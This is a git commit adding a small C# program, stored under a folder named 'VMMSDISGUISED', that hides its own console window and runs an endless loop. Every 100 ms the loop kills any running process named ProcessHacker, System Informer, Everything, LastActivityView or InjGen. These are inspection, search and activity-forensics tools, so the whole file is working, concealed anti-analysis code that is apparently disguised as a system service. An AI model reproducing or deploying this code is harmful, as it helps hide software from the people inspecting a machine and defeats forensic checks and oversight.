9759549eb1c8d11380efbd0d0bb890ba0ff0d4f5
A1mgo <113758748+jantaran@users.noreply.github.com>
2025-06-23 23:15:30 +0300

    Add files via upload

---
+++ VMMS/VMMSDISGUISED/Program.cs
@@ -0,0 +1,40 @@
+﻿using System;
+using System.Diagnostics;
+using System.Threading;
+using System.Runtime.InteropServices;
+
+class Program
+{
+    // Hide console window
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    const int SW_HIDE = 0;
+
+    static void Main()
+    {
+        // Hide the console window immediately
+        var handle = GetConsoleWindow();
+        ShowWindow(handle, SW_HIDE);
+
+        while (true)
+        {
+            foreach (var procName in new[] { "ProcessHacker", "systeminformer", "everything","LastActivityView","InjGen" })
+            {
+                var procs = Process.GetProcessesByName(procName);
+                foreach (var proc in procs)
+                {
+                    try
+                    {
+                        proc.Kill();
+                    }
+                    catch { /* ignore failures */ }
+                }
+            }
+            Thread.Sleep(100); // check every 100 ms
+        }
+    }
+}
